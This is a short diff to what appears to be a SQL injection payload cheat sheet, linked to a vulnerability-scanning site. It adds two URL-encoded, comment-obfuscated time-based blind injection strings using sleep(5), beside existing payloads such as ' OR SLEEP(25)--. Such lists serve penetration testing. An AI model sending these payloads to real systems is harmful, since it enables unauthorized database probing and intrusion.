@@ -114,6 +114,8 @@ https://pentest-tools.com/website-vulnerability-scanning/sql-injection-scanner-o
 ```
 > error reuslt
 ```
+1234'%2F%2A%2A%2FAnd%2F%2A%2A%2F%0Asleep(5)
+1234'%2F%2A%2A%2FAnd%2F%2A%2A%2F%0Asleep(5%29
 ' OR SLEEP(25)--
 '
 ~`
